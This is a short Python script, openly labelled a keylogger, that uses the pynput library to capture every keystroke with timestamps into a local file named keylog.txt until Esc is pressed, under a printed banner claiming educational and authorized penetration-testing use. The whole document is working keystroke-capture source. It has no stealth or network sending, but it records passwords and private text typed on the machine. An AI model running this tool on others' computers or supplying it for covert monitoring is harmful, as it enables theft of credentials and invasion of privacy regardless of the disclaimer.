from pynput import keyboard
import logging
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# --- WARNING ---
print(f"{Fore.RED}{Style.BRIGHT}*** ETHICAL USE WARNING ***")
print(f"{Fore.YELLOW}This keylogger is for educational and authorized penetration testing purposes ONLY.")
print(f"{Fore.YELLOW}Unauthorized use of this tool on any computer system is illegal.")
print(f"{Fore.YELLOW}The author is not responsible for any misuse or damage.")
print(f"{Fore.RED}{Style.BRIGHT}***************************\n")

log_file = "keylog.txt"

# Set up logging
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

print(f"{Fore.GREEN}Keylogger started. Press 'Esc' to stop.")
print(f"Keystrokes will be saved to '{log_file}'")

def on_press(key):
    try:
        # Log alphanumeric keys
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        # Log special keys (e.g., space, enter, etc.)
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    # Stop the listener when the 'Esc' key is released
    if key == keyboard.Key.esc:
        print(f"\n{Fore.GREEN}Keylogger stopped.")
        return False

# Start listening to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
